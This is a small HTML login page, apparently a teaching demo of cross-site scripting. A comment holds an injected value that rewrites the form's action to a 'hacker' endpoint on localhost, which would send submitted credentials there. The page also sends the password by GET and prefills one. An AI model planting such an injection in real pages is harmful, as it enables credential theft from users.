<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>login</title>
</head>
<body>


<br>
 <form id="login" action="login" method="GET">
      ID:

      <!--
      <input id="id" type="text" name="id" size="30"  value=" "><script> var f=document.getElementById("login"); f.action="http://localhost:7882/hacker"; f.method="get";</script><span+s=" " />
       -->
      <input id="id" type="text" name="id" size="30"  value="your id " />



      <br>
     PWD:<input id="pwd" type="password" name="pwd" value="Tony" size="30"/> <br>
         <input type="submit" value="Login"/>
 </form>

 <script>

 var getQueryString = function ( field, url ) {
     var href = url ? url : window.location.href;
     var reg = new RegExp( '[?&]' + field + '=([^&#]*)', 'i' );
     var string = reg.exec(href);
     return string ? string[1] : null;
 };

 console.log("parse the id parameter value");
 var idValue=getQueryString("id");
 console.log("queryString id="+idValue);

 var id = document.getElementById("id");
 id.value=idValue;




 </script>

</body>
</html>